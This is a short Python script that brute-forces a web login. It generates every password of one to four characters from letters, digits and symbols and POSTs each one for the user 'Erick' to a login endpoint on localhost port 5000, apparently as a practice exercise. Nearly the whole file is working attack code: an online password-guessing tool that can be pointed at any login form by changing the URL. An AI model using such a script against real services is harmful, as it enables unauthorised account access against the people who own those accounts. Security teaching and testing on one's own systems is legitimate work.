import itertools
import requests
import sys

letrasMay = "ABCDEFGHIJKLMNÑOPQRSTUVWXYZ"
letrasMin = "abcdefghijklmnñopqrstuvwxyz"
numeros = "0123456789"
signos = "!#$%&/()=?¡*¨[_:;¿'+{-.,}]"

alfabeto = letrasMay + letrasMin + numeros + signos

def main():
    url = "http://127.0.0.1:5000/Login"
    user = "Erick"
    
    for r in range(1,5):
        for combinacion in itertools.product(alfabeto, repeat=r):
            combinacion = "".join(combinacion)
            try:
                resp = requests.post(url, data={"username": user, "password": combinacion}, timeout=1)
                if resp.status_code == 200:
                    sys.exit(0)
            except requests.RequestException as e:
                print("Request error:", e)
                
if __name__ == "__main__":
    main()
